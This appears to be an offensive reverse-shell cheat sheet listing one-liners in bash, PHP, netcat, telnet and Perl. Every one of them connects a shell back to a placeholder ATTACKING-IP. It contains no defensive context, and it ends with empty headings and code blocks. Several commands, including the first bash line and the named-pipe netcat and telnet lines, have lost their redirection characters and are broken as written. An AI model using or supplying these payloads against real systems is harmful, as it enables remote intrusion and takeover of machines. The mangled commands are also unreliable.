# Bash Reverse Shells

```bash
exec /bin/bash 0&0 2>&0

```

```bash
0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196

```
```bash
exec 5<>/dev/tcp/ATTACKING-IP/80
cat <&5 | while read line; do $line 2>&5 >&5; done  

# or:

while read line 0<&5; do $line 2>&5 >&5; done
```

# PHP Reverse Shell

```php

php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
```

# Netcat Reverse Shell

```shell

nc -e /bin/sh ATTACKING-IP 80

/bin/sh | nc ATTACKING-IP 80

rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p

```

# Telnet Reverse Shell

```bash

rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p

telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443

```

# Perl Reverse Shell

```perl

perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```

#

```

```

#

```

```

#

```

```

#

```

```
